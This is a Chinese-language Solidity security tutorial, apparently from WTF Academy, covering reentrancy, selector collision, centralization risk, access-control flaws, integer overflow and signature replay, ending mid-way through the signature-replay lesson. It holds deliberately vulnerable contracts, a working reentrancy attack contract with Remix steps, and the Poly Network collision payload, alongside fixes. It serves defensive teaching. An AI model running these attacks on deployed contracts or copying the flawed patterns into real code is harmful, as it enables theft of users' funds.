

# References

[S01. 重入攻击 | WTF Academy](https://www.wtf.academy/docs/solidity-104/S01_ReentrancyAttack/)

# S01. 重入攻击

这一讲，我们将介绍最常见的一种智能合约攻击-重入攻击，它曾导致以太坊分叉为 ETH 和 ETC（以太经典），并介绍如何避免它。

## 重入攻击

重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如 fallback 函数）循环调用合约，将合约中资产转走或铸造大量代币。

一些著名的重入攻击事件：

- 2016 年，The DAO 合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 `ETH`，并导致以太坊分叉为 `ETH` 链和 `ETC`（以太经典）链。
- 2019 年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 `sETH`。
- 2020 年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。
- 2021 年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。
- 2022 年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。

距离 The DAO 被重入攻击已经 6 年了，但每年还是会有几次因重入漏洞而损失千万美元的项目，因此理解这个漏洞非常重要。

## `0xAA` 抢银行的故事

为了让大家更好理解，这里给大家讲一个"黑客`0xAA`抢银行"的故事。

以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：

1. 查询用户的 `ETH` 余额，如果大于 0，进行下一步。
2. 将用户的 `ETH` 余额从银行转给用户，并询问用户是否收到。
3. 将用户名下的余额更新为`0`。

一天黑客 `0xAA` 来到了银行，这是他和机器人柜员的对话：

- 0xAA : 我要取钱，`1 ETH`。
- Robot: 正在查询您的余额：`1 ETH`。正在转帐`1 ETH`到您的账户。您收到钱了吗？
- 0xAA : 等等，我要取钱，`1 ETH`。
- Robot: 正在查询您的余额：`1 ETH`。正在转帐`1 ETH`到您的账户。您收到钱了吗？
- 0xAA : 等等，我要取钱，`1 ETH`。
- Robot: 正在查询您的余额：`1 ETH`。正在转帐`1 ETH`到您的账户。您收到钱了吗？
- 0xAA : 等等，我要取钱，`1 ETH`。
- ...

最后，`0xAA`通过重入攻击的漏洞，把银行的资产搬空了，银行卒。



![img](https://www.wtf.academy/assets/images/S01-1-6328e572390075b19e16cfd5dfc67ab5.png)



## 漏洞合约例子

### 银行合约

银行合约非常简单，包含`1`个状态变量`balanceOf`记录所有用户的以太坊余额；包含`3`个函数：

- `deposit()`：存款函数，将`ETH`存入银行合约，并更新用户的余额。
- `withdraw()`：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。**注意：这个函数有重入漏洞！**
- `getBalance()`：获取银行合约里的`ETH`余额。

```solidity
contract Bank {
    mapping (address => uint256) public balanceOf;    // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取余额
        require(balance > 0, "Insufficient balance");
        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```



### 攻击合约

重入攻击的一个攻击点就是合约转账`ETH`的地方：转账`ETH`的目标地址如果是合约，会触发对方合约的`fallback`（回退）函数，从而造成循环调用的可能。如果你不了解回退函数，可以阅读[WTF Solidity 极简教程第 19 讲：接收 ETH](https://github.com/AmazingAng/WTF-Solidity/blob/main/19_Fallback/readme.md)。`Bank`合约在`withdraw()`函数中存在`ETH`转账：

```text
(bool success, ) = msg.sender.call{value: balance}("");
```



假如黑客在攻击合约中的`fallback()`或`receive()`函数中重新调用了`Bank`合约的`withdraw()`函数，就会造成`0xAA`抢银行故事中的循环调用，不断让`Bank`合约转账给攻击者，最终将合约的`ETH`提空。

```solidity
    receive() external payable {
        bank.withdraw();
    }
```



下面我们看下攻击合约，它的逻辑非常简单，就是通过`receive()`回退函数循环调用`Bank`合约的`withdraw()`函数。它有`1`个状态变量`bank`用于记录`Bank`合约地址。它包含`4`个函数：

- 构造函数: 初始化`Bank`合约地址。
- `receive()`: 回调函数，在接收`ETH`时被触发，并再次调用`Bank`合约的`withdraw()`函数，循环提款。
- `attack()`：攻击函数，先`Bank`合约的`deposit()`函数存款，然后调用`withdraw()`发起第一次提款，之后`Bank`合约的`withdraw()`函数和攻击合约的`receive()`函数会循环调用，将`Bank`合约的`ETH`提空。
- `getBalance()`：获取攻击合约里的`ETH`余额。

```solidity
contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }

    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

> [!IMPORTANT]
>
> ### 攻击流程
>
> 1. **初始化攻击**
>    - 攻击者部署 `Attack` 合约，并将目标 `Bank` 合约的地址作为参数传入。
> 2. **启动攻击**
>    - 攻击者调用 `attack` 函数，发送 1 ether。
>    - `Attack` 合约在调用 `bank.deposit` 时将 1 ether 存入 `Bank` 合约。
>    - 接下来，调用 `bank.withdraw`，此时触发了重入攻击。
> 3. **重入过程**
>    - 在 `Bank` 合约的 `withdraw` 函数执行时，`msg.sender` 是 `Attack` 合约。合约进行转账后，控制权返回到 `Attack` 合约的 `receive` 函数。
>    - 如果 `Bank` 合约的余额仍然大于或等于 1 ether，`receive` 函数会再次调用 `bank.withdraw`。
>    - 这个过程可以重复，攻击者可以在 `Bank` 合约的余额被耗尽之前提取大量以太币。

> [!TIP]
>
> ### 递归调用栈示意图
>
> 以下是一个简化的递归调用栈示意图，展示攻击过程的每一步：
>
> ```
> attack()                // 攻击者调用 attack 函数
> └── bank.deposit()      // 存入 1 ether
>     └── bank.withdraw() // 第一次调用 withdraw 函数
>         ├── (转账)      // 转账 1 ether 到 Attack 合约
>         └── receive()   // 控制权转移到 Attack 合约的 receive 函数
>             └── bank.withdraw() // 再次调用 withdraw 函数
>                 ├── (转账)      // 转账 1 ether 到 Attack 合约
>                 └── receive()   // 控制权再次转移
>                     └── bank.withdraw() // 再次调用 withdraw 函数
>                         ├── (转账)      // 转账 1 ether 到 Attack 合约
>                         └── receive()   // 控制权继续转移
>                           ...
> ```
>
> ### 说明
>
> - **攻击者调用 `attack` 函数**：此函数是攻击的起点。
> - **`bank.deposit()`**：攻击者将 1 ether 存入 `Bank` 合约。
> - **`bank.withdraw()`**：攻击者请求提取余额，此时合约执行转账并将控制权转移给 `Attack` 合约的 `receive` 函数。
> - **`receive()`**：此回调函数会检查 `Bank` 合约的余额并决定是否再次调用 `withdraw` 函数。每次调用都可以重复提取 `Bank` 合约中的以太币，直到其余额耗尽。
>
> 通过这种递归调用栈的方式，我们可以清晰地理解攻击的过程以及如何通过重入攻击多次提取资金。每次调用 `withdraw` 函数后，控制权返回到 `receive` 函数，再次调用 `withdraw`，形成递归。这样，攻击者可以反复提取资金，直到 `Bank` 合约的余额耗尽。



## `Remix`演示

1. 部署`Bank`合约，调用`deposit()`函数，转入`20 ETH`。
2. 切换到攻击者钱包，部署`Attack`合约。
3. 调用`Attack`合约的`attack()`函数发动攻击，调用时需转账`1 ETH`。
4. 调用`Bank`合约的`getBalance()`函数，发现余额已被提空。
5. 调用`Attack`合约的`getBalance()`函数，可以看到余额变为`21 ETH`，重入攻击成功。

## 预防办法

目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。

### 检查-影响-交互模式

检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将`Bank`合约`withdraw()`函数中的更新余额提前到转账`ETH`之前，就可以修复漏洞：

```solidity
function withdraw() external {
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");
    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH
    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。
    balanceOf[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");
}
```



### 重入锁

重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为`0`的状态变量`_status`。被`nonReentrant`重入锁修饰的函数，在第一次调用时会检查`_status`是否为`0`，紧接着将`_status`的值改为`1`，调用结束后才会再改为`0`。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读[WTF Solidity 极简教程第 11 讲：修饰器](https://github.com/AmazingAng/WTF-Solidity/blob/main/11_Modifier/readme.md)。

```solidity
uint256 private _status; // 重入锁

// 重入锁
modifier nonReentrant() {
    // 在第一次调用 nonReentrant 时，_status 将是 0
    require(_status == 0, "ReentrancyGuard: reentrant call");
    // 在此之后对 nonReentrant 的任何调用都将失败
    _status = 1;
    _;
    // 调用结束，将 _status 恢复为0
    _status = 0;
}
```



只需要用`nonReentrant`重入锁修饰`withdraw()`函数，就可以预防重入攻击了。

```solidity
// 用重入锁保护有漏洞的函数
function withdraw() external nonReentrant{
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");

    balanceOf[msg.sender] = 0;
}
```



此外，OpenZeppelin 也提倡遵循 PullPayment(拉取支付)模式以避免潜在的重入攻击。其原理是通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”。当想要发起一笔转账时，会通过`_asyncTransfer(address dest, uint256 amount)`将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失。而当接受者想要接受转账时，需要主动调用`withdrawPayments(address payable payee)`进行资产的主动获取。

## 总结

这一讲，我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个`0xAA`抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行`ETH`转账时进行重入攻击。实际业务中，`ERC721`和`ERC1155`的`safeTransfer()`和`safeTransferFrom()`安全转账函数，还有`ERC777`的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的`external`函数，虽然可能会消耗更多的`gas`，但是可以预防更大的损失。

# S02. 选择器碰撞

这一讲，我们将介绍选择器碰撞攻击，它是导致跨链桥 Poly Network 被黑的原因之一。在2021年8月，Poly Network在ETH，BSC，和Polygon上的跨链桥合约被盗，损失高达6.11亿美元（[总结](https://rekt.news/zh/polynetwork-rekt/)）。这是2021年最大的区块链黑客事件，也是历史被盗金额榜单上第2名，仅次于 Ronin 桥黑客事件。

## 选择器碰撞

以太坊智能合约中，函数选择器是函数签名 `"<function name>(<function input types>)"` 的哈希值的前`4`个字节（`8`位十六进制）。当用户调用合约的函数时，`calldata`的前`4`字节就是目标函数的选择器，决定了调用哪个函数。如果你不了解它，可以阅读[WTF Solidity极简教程第29讲：函数选择器](https://github.com/AmazingAng/WTF-Solidity/blob/main/29_Selector/readme.md)。

由于函数选择器只有`4`字节，非常短，很容易被碰撞出来：即我们很容易找到两个不同的函数，但是他们有着相同的函数选择器。比如`transferFrom(address,address,uint256)`和`gasprice_bit_ether(int128)`有着相同的选择器：`0x23b872dd`。当然你也可以写个脚本暴力破解。



![img](https://www.wtf.academy/assets/images/S02-1-eaca2b2f5ba2014d5109de2ee01ecda2.png)



大家可以用这两个网站来查同一个选择器对应的不同函数：

1. https://www.4byte.directory/
2. https://sig.eth.samczsun.com/

你也可以使用下面的`Power Clash`工具进行暴力破解：

1. PowerClash: https://github.com/AmazingAng/power-clash

相比之下，钱包的公钥有`64`字节，被碰撞出来的概率几乎为`0`，非常安全。

## `0xAA` 解决斯芬克斯之谜

以太坊的人得罪了天神，天神震怒。天后赫拉为了惩罚以太坊的人，在以太坊的峭崖上降下一个名叫斯芬克斯的人面狮身的女妖。她向每一个路过悬崖的以太坊用户提出一个谜语：“什么东西在早晨用四只脚走路，中午两只脚走路，晚间三只脚走路，在一切生物中这是唯一的用不同数目的脚走路的生物。脚最多的时候，正是速度和力量最小的时候。”对于这个奥妙费解的谜语，凡猜中者即可活命，凡猜不中者一律被吃掉。过路的人全被斯芬克斯吃了，以太坊用户陷入恐惧之中。斯芬克斯用选择器`0x10cd2dc7`来验证答案是否正确。

有一天上午，俄狄浦斯路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是`"function man()"`啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语被猜中后，俄狄浦斯得以生还。

那一天下午，`0xAA`路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是`"function peopleLduohW(uint256)"`啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语再次被猜中后，斯芬克斯气急败坏，脚下一打滑就从巍峨的峭崖上掉下去摔死了。



![img](https://www.wtf.academy/assets/images/S02-2-e3d3fa392785e79e663a82277f519657.png)



## 漏洞合约例子

### 漏洞合约

下面我们来看一下有漏洞的合约例子。`SelectorClash`合约有`1`个状态变量 `solved`，初始化为`false`，攻击者需要将它改为`true`。合约主要有`2`个函数，函数名沿用自 Poly Network 漏洞合约。

1. `putCurEpochConPubKeyBytes()` ：攻击者调用这个函数后，就可以将`solved`改为`true`，完成攻击。但是这个函数检查`msg.sender == address(this)`，因此调用者必须为合约本身，我们需要看下其他函数。
2. `executeCrossChainTx()` ：通过它可以调用合约内的函数，但是函数参数的类型和目标函数不太一样：目标函数的参数为`(bytes)`，而这里调用的函数参数为`(bytes,bytes,uint64)`。

```solidity
contract SelectorClash {
    bool public solved; // 攻击是否成功

    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。
    function putCurEpochConPubKeyBytes(bytes memory _bytes) public {
        require(msg.sender == address(this), "Not Owner");
        solved = true;
    }

    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。
    function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success){
        (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, "(bytes,bytes,uint64)"))), abi.encode(_bytes, _bytes1, _num)));//使用 abi.encodePacked 结合 keccak256 计算 _method 的函数选择器，并将其与其他参数一起编码，试图调用合约的其他函数。
    }
}
```



### 攻击方法

我们的目标是利用`executeCrossChainTx()`函数调用合约中的`putCurEpochConPubKeyBytes()`，目标函数的选择器为：`0x41973cd9`。观察到`executeCrossChainTx()`中是利用`_method`参数和`"(bytes,bytes,uint64)"`作为函数签名计算的选择器。因此，我们只需要选择恰当的`_method`，让这里算出的选择器等于`0x41973cd9`，通过选择器碰撞调用目标函数。

Poly Network黑客事件中，黑客碰撞出的`_method`为 `f1121318093`，即`f1121318093(bytes,bytes,uint64)`的哈希前`4`位也是`0x41973cd9`，可以成功的调用函数。接下来我们要做的就是将`f1121318093`转换为`bytes`类型：`0x6631313231333138303933`，然后作为参数输入到`executeCrossChainTx()`中。`executeCrossChainTx()`函数另`3`个参数不重要，填 `0x`, `0x`, `0` 就可以。

## `Remix`演示

1. 部署`SelectorClash`合约。
2. 调用`executeCrossChainTx()`，参数填`0x6631313231333138303933`，`0x`，`0x`，`0`，发起攻击。
3. 查看`solved`变量的值，被修改为`true`，攻击成功。

## 总结

这一讲，我们介绍了选择器碰撞攻击，它是导致跨链桥 Poly Network 被黑 6.1 亿美金的的原因之一。这个攻击告诉了我们：

1. 函数选择器很容易被碰撞，即使改变参数类型，依然能构造出具有相同选择器的函数。
2. 管理好合约函数的权限，确保拥有特殊权限的合约的函数不能被用户调用。

# S03. 中心化风险

这一讲，我们将介绍智能合约中的中心化和伪去中心化所带来的风险。`Ronin`桥和`Harmony`桥因该漏洞被黑客攻击，分别被盗取了 6.24 亿美元和 1 亿美元。

## 中心化风险

我们经常以 Web3 的去中心化为骄傲，认为在 Web3.0 世界里，所有权和控制权都是去中心化。但实际上，中心化是 Web3 项目最常见的风险之一。知名区块链审计公司 Certik 在[2021 年 DeFi 安全报告](https://f.hubspotusercontent40.net/hubfs/4972390/Marketing/defi security report 2021-v6.pdf)中指出：

> 中心化风险是 DeFi 中最常见的漏洞，2021 年中有 44 次 DeFi 黑客攻击与它相关，造成用户资金损失超过 13 亿美元。这强调了权力下放的重要性，许多项目仍需努力实现这一目标。

中心化风险指智能合约的所有权是中心化的，例如合约的`owner`由一个地址控制，它可以随意修改合约参数，甚至提取用户资金。中心化的项目存在单点风险，可以被恶意开发者（内鬼）或黑客利用，只需要获取具有控制权限地址的私钥之后，就可以通过`rug-pull`，无限铸币，或其他类型方法盗取资金。

链游项目`Vulcan Forged`在 2021 年 12 月因私钥泄露被盗 1.4 亿美元，DeFi 项目`EasyFi`在 2021 年 4 月因私钥泄露被盗 5900 万美元，DeFi 项目`bZx`在钓鱼攻击中私钥泄露被盗 5500 万美元。

## 伪去中心化风险

伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险。比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。这类项目由于包装的很去中心化，容易得到投资者信任，所以当黑客事件发生时，被盗金额也往往更大。

近两年爆火的链游项目 Axie 的 Ronin 链跨链桥项目在 2022 年 3 月被盗 6.24 亿美元，是历史上被盗金额最大的事件。Ronin 跨链桥由 9 个验证者维护，必须有 5 个人达成共识才能批准存款和提款交易。这看起来像多签一样，非常去中心化。但实际上其中 4 个验证者由 Axie 的开发公司 Sky Mavis 控制，而另 1 个由 Axie DAO 控制的验证者也批准了 Sky Mavis 验证节点代表他们签署交易。因此，在攻击者获取了 Sky Mavis 的私钥后（具体方法未披露），就可以控制 5 个验证节点，授权盗走了 173,600 ETH 和 2550 万 USDC。此外，在 2023 年 8 月 1 日，PEPE 多重签名钱包将阈值从`5/8`更改为仅`2/8`，并从多签地址转出大量 PEPE，这也是伪去中心化的体现。

`Harmony`公链的跨链桥在 2022 年 6 月被盗 1 亿美元。`Harmony`桥由 5 个多签人控制，很离谱的是只需其中 2 个人签名就可以批准一笔交易。在黑客设法盗取两个多签人的私钥后，将用户质押的资产盗空。



![img](https://www.wtf.academy/assets/images/S03-1-0a4f3c8b6e74ae0ea5f53955ea8170d9.png)



## 漏洞合约例子

有中心化风险的合约多种多样，这里只举一个最常见的例子：`owner`地址可以任意铸造代币的`ERC20`合约。当项目内鬼或黑客取得`owner`的私钥后，可以无限铸币，造成投资人大量损失。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Centralization is ERC20, Ownable {
    constructor() ERC20("Centralization", "Cent") {
        address exposedAccount = 0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2;
        transferOwnership(exposedAccount);
    }

    function mint(address to, uint256 amount) external onlyOwner{
        _mint(to, amount);
    }
}
```



## 如何减少中心化/伪去中心化风险？

1. 使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4/7 或 6/9 多签。如果你不了解多签钱包，可以阅读[WTF Solidity 第 50 讲：多签钱包](https://github.com/AmazingAng/WTF-Solidity/blob/main/50_MultisigWallet/readme.md)。
2. 多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名。
3. 使用时间锁控制合约，在黑客或项目内鬼修改合约参数/盗取资产时，项目方和社区有一些时间来应对，将损失最小化。如果你不了解时间锁合约，可以阅读[WTF Solidity 第 45 讲：时间锁](https://github.com/AmazingAng/WTF-Solidity/blob/main/45_Timelock/readme.md)。

## 总结

中心化/伪去中心化是区块链项目最大的风险，近两年造成用户资金损失超过 20 亿美元。中心化风险通过分析合约代码就可以发现，而伪去中心化风险藏的更深，需要对项目进行细致的尽职调查才能发现。

# S04. 权限管理漏洞

这一讲，我们将介绍智能合约的权限管理漏洞。这个漏洞导致了跨链桥 Poly Network 被黑 6.11 亿美元，并导致了BSC上DeFi项目 ShadowFi 被黑 $300,000。

## 权限管理漏洞

智能合约中的权限管理定义了不同角色在应用中的权限。通常来说，代币的铸造、提取资金、暂停等功能都需要较高权限的用户才能调用。如果权限配置错误，就可能造成意想不到的损失。下面我们介绍两种常见的权限管理漏洞。

### 1. 权限配置错误

如果合约中特殊功能没有加上权限管理，那么任何人都能铸造大量代币或将合约中的资金提光。跨链桥 Poly Network 的合约中转移守护者的函数没有配置相应权限，被黑客改为自己的地址，从而提走了合约中的 6.11 亿美元。

在下面的代码中，`mint()`函数没有进行权限管理，那么任何人都可以调用它铸造代币。

```solidity
// 错误的mint函数，没有限制权限
function badMint(address to, uint amount) public {
    _mint(to, amount);
}
```





![img](https://www.wtf.academy/assets/images/S04-1-3dcfc0682f4a7d1a3c3e4dd54dadda19.png)



### 2. 授权检查错误

另一类常见的权限管理漏洞是没有在函数中检查调用者是否拥有足够的授权。BSC上DeFi项目 ShadowFi 的代币合约忘了在 `burn()` 销毁函数中检查调用者的授权额度，导致攻击者可以任意的销毁其他地址的代币。在黑客将流动性池子中的代币销毁之后，仅需卖出一点代币就可以将池子里的所有 `BNB` 提走，获利 $300,000。

```solidity
// 错误的burn函数，没有限制权限
function badBurn(address account, uint amount) public {
    _burn(account, amount);
}
```





![img](https://www.wtf.academy/assets/images/S04-2-795724a7471724958f8e8933e2c71aff.png)



## 预防办法

权限管理漏洞主要有两种预防办法：

1. 使用 Openzeppelin 的权限管理库给合约的特殊函数配置相应的权限，比如使用`OnlyOwner`修饰器，只有合约所有者才能调用。

   ```solidity
   // 正确的mint函数，使用 onlyOwner 修饰器限制权限
   function goodMint(address to, uint amount) public onlyOwner {
       _mint(to, amount);
   }
   ```

   

2. 在函数的逻辑中确保合约调用者拥有足够的授权。

   ```solidity
   // 正确的burn函数，如果销毁的不是自己的代币，则会检查授权
   function goodBurn(address account, uint amount) public {
       if(msg.sender != account){
           _spendAllowance(account, msg.sender, amount);
       }
       _burn(account, amount);
   }
   ```

   

## 总结

这一讲，我们介绍了智能合约中的权限管理漏洞。它主要有两种形式：权限配置错误和授权检查错误。为了避免这类漏洞，我们要使用权限管理库给特殊函数配置相应的权限，并且在函数的逻辑中确保合约调用者拥有足够的授权。

# S05. 整型溢出

这一讲，我们将介绍整型溢出漏洞（Arithmetic Over/Under Flows）。这是一个比较经典的漏洞，Solidity 0.8版本后内置了Safemath库，因此很少发生。

## 整型溢出

以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。例如 `uint8`，只能表示 [0,255] 范围内的数字。如果给 `uint8` 类型变量的赋值 `257`，则会上溢（overflow）变为 `1`；如果给它赋值`-1`，则会下溢（underflow）变为`255`。

攻击者可以利用这个漏洞进行攻击：想象一下，黑客余额为`0`，他凭空花 `$1` 之后，余额突然变成了 `$2^256-1`。2018年的土狗项目 `PoWHC` 因为这个漏洞被盗了 `866 ETH`。



![img](https://www.wtf.academy/assets/images/S05-1-68f8d2837f3303ff923b05a12377f3df.png)



## 漏洞合约例子

下面这个例子是一个简单的代币合约，参考了 `Ethernaut` 中的合约。它有 `2` 个状态变量：`balances` 记录了每个地址的余额，`totalSupply` 记录了代币总供给。

它有 `3` 个函数：

- 构造函数：初始化代币总供给。
- `transfer()`：转账函数。
- `balanceOf()`：查询余额函数。

由于solidity `0.8.0` 版本之后会自动检查整型溢出错误，溢出时会报错。如果我们要重现这种漏洞，需要使用 `unchecked` 关键字，在代码块中临时关掉溢出检查，就像我们在 `transfer()` 函数中做的那样。

这个例子中的漏洞就出现在`transfer()` 函数中，`require(balances[msg.sender] - _value >= 0);` 这个检查由于整型溢出，永远都会通过。因此用户可以无限转账。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract Token {
  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }
  
  function transfer(address _to, uint _value) public returns (bool) {
    unchecked{
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
    }
    return true;
  }
  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```



## `Remix` 复现

1. 部署 `Token` 合约，将总供给设为 `100`。
2. 向另一个账户转账 `1000` 个代币，可以转账成功。
3. 查询自己账户的余额，发现是一个非常大的数字，约为`2^256`。

## 预防办法

1. Solidity `0.8.0` 之前的版本，在合约中引用 [Safemath 库](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol)，在整型溢出时报错。
2. Solidity `0.8.0` 之后的版本内置了 `Safemath`，因此几乎不存在这类问题。开发者有时会为了节省gas使用 `unchecked` 关键字在代码块中临时关闭整型溢出检测，这时要确保不存在整型溢出漏洞。

## 总结

这一讲，我们介绍了经典的整型溢出漏洞，由于solidity 0.8.0 版本后内置 `Safemath` 的整型溢出检查，这类漏洞已经很少见了。

# S06. 签名重放

这一讲，我们将介绍智能合约的签名重放（Signature Replay）攻击和预防方法，它曾间接导致了著名做市商 Wintermute 被盗2000万枚 $OP。

## 签名重放

上学的时候，老师经常会让家长签字，有时候家长很忙，我就会很“贴心”照着以前的签字抄一遍。某种意义上来说，这就是签名重放。

在区块链中，数字签名可以用于识别数据签名者和验证数据完整性。发送交易时，用户使用私钥签名交易，使得其他人可以验证交易是由相应账户发出的。智能合约也能利用 `ECDSA` 算法验证用户将在链下创建的签名，然后执行铸造或转账等逻辑。更多关于数字签名的介绍请见[WTF Solidity第37讲：数字签名](https://github.com/AmazingAng/WTF-Solidity/blob/main/37_Signature/readme.md)。

数字签名一般有两种常见的重放攻击：

1. 普通重放：将本该使用一次的签名多次使用。NBA官方发布的《The Association》系列 NFT 因为这类攻击被免费铸造了上万枚。
2. 跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。做市商 Wintermute 因为跨链重放攻击被盗2000万枚 $OP。



![img](https://www.wtf.academy/assets/images/S06-1-56e7d221a9d382fd5d459b9653bbec1c.png)

> [!NOTE]
>
> **签名重放攻击**（Replay Attack）和**重入攻击**（Reentrancy Attack）是两种不同类型的攻击，尽管它们在某些方面有相似之处，但它们的机制和影响有所不同。
>
> ### 签名重放攻击
>
> - **定义**：签名重放攻击是指攻击者截获并重用有效交易或消息的签名，以便在另一环境中伪造有效请求。攻击者可以利用合法用户的签名，在未授权的环境中重新执行某个操作。
> - **示例**：假设用户在链A上发送了一个交易，该交易被成功处理。攻击者截获了这个交易的签名，并将其用在链B上（或同一链的不同条件下）进行重放。这可能导致用户在链B上执行了一项他们并不想执行的操作。
> - **影响**：这种攻击会导致资金丢失或状态改变，因为用户的操作被未经授权地重用。
>
> ### 重入攻击
>
> - **定义**：重入攻击是指攻击者利用智能合约在执行过程中调用外部合约，从而在状态变更之前重新进入当前合约的函数。这种攻击通常发生在以太坊智能合约中，特别是在未正确处理状态更改的情况下。
> - **示例**：攻击者可以设计一个合约，在调用受害合约的提现函数时，该合约会在提现之前通过回调函数再次调用提现函数，导致攻击者可以重复提款。
> - **影响**：攻击者可以多次提取资金，导致合约中的资金被耗尽。
>
> ### 总结
>
> - **相同点**：两者都可以导致资金损失和状态不一致。
> - **不同点**：
>   - 签名重放攻击侧重于对有效签名的重用，攻击者利用已存在的有效请求。
>   - 重入攻击则侧重于合约的执行逻辑，攻击者通过智能合约间的调用关系来进行攻击。
>
> ### 结论
>
> 虽然两者都属于攻击手段，但签名重放攻击和重入攻击在原理和实施方式上是不同的。对于智能合约开发者来说，理解这两种攻击方式的区别有助于设计出更加安全的合约，避免可能的安全漏洞。



## 漏洞合约例子

下面的`SigReplay`合约是一个`ERC20`代币合约，它的铸造函数有签名重放漏洞。它使用链下签名让白名单地址 `to` 铸造相应数量 `amount` 的代币。合约中保存了 `signer` 地址，来验证签名是否有效。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

// 权限管理错误例子
contract SigReplay is ERC20 {

    address public signer;

    // 构造函数：初始化代币名称和代号
    constructor() ERC20("SigReplay", "Replay") {
        signer = msg.sender;
    }
    
    /**
     * 有签名重放漏洞的铸造函数
     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
     * amount: 1000
     * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b
     */
    function badMint(address to, uint amount, bytes memory signature) public {
        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));
        require(verify(_msgHash, signature), "Invalid Signer!");
        _mint(to, amount);
    }
    //消息哈希: 使用 getMessageHash 生成包含目标地址和铸造数量的哈希值，并通过 toEthSignedMessageHash 转换为以太坊签名消息格式。
    //签名验证: 使用 verify 函数检查签名的有效性，如果签名无效，则抛出异常。verify函数在下面。
    //铸造代币: 如果签名有效，则调用 _mint 函数将指定数量的代币铸造到目标地址。
    
    
    /**
